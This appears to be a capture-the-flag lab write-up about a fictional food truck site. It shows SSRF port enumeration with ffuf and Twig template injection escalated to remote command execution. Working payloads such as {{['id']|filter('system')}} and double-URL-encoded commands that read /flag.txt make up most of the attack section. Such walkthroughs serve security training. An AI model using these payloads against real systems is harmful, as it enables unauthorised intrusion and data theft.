# Background:

Flavor Fusion Express has hired us to perform a security assessment of their new website. They have expressed concern about potential server-side vulnerabilities that could compromise their sensitive information.

So we need to evaluate the sites for exploits against:

-	Backend infrastructure
- Website configuration
- Server logic



# Recon:

If we go to the website, we'll find that theres some info about the business, such as three locations, a customer comment, as well as a few buttons that don't go anywhere.

However if we open devtools, well find an API:

	<p align="center">
		<insert pic>
	</p>



If we go to the website through a proxy server we will intercept a GET request, and after sending it we'll intercept POST request, and at the bottom we have the data:

	api=http://truckapi.htb/?id%3DFusionExpress01

- Notice that the id= has been url encoded into id%3D, suggesting that url encoding is expected by the API.


If we send the request, we'll get the key values pairs back:

	{"id": "FusionExpress01", "location": "321 Maple Lane"}

- It looks like the API used the id param to get the food trucks location, then the site renders them both in the webpage.



# Attack:

Let's see what happens when we modify whats given to the API.

Lets see if a Server Side Request Forgery (SSRF) will allow us to discover any unexposed services.

First, send a request to an unlikly port:

	api=http://127.0.0.1:1234

- The server responds with:

		Error (7): Failed to connect to 127.0.0.1 port 1234 after 0 ms: Couldn't connect to server

Next copy the request and paste in in a text file (req.txt). Replace the port with FUZZ. Then make a wordlist for the ports we will fuzz:

	seq 1 10000 > ports.txt

Now we can enumerate the services:

	ffuf --request req.txt -request-proto http -w ports.txt -mc all -fr 'Error \(7\)'

- After the scan, we've found port 80, and 3306, which is typically a mysql port. This is likly where our client is storing their sensitive data.


So we've been able to use SSRF to learn gain additional info about our target.

Now lets go back to the the proxy and send a standard

Since the  lets try a Server-Side Template Injection (SSTI).

	api=http://truckapi.htb/?id%3D{{7*7}}


- The responce is:

		{"id": "49", "location": "134 Main Street"}

- If the payload doesn't work, try url encoding your payload.

Since the payload {{7*7}} works, lets see if we can determine the template engine with:

	api=http://truckapi.htb/?id%3D{{7*'7'}}

- This returns:

		{"id": "49", "location": "134 Main Street"}

- Therefore the template is Twig.

Because we are working with twig we know how to craft more complicated payloads, with that let's try for Remote Code Execution (RCE):

	api=http://truckapi.htb/?id%3D{{['id']|filter('system')}}

- The server responds with:

		{"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)
Array", "location": "134 Main Street"}

- We've got RCE!

Now lets find the flag:

	api=http://truckapi.htb/?id%3D%7B%7B%5B%27ls%2520%2F%27%5D%7Cfilter%28%27system%27%29%7D%7D

- Note: the target is very particular with its encoding, so make sure to double url enncode any spaces

	- Ex: ['ls /'] -> ['ls%20/'] -> %5B%27ls%2520%2F%27%5D

Now we can get the flag:

	api=http://truckapi.htb/?id%3D%7B%7B%5B%27cat%2520%2Fflag.txt%27%5D%7Cfilter%28%27system%27%29%7D%7D

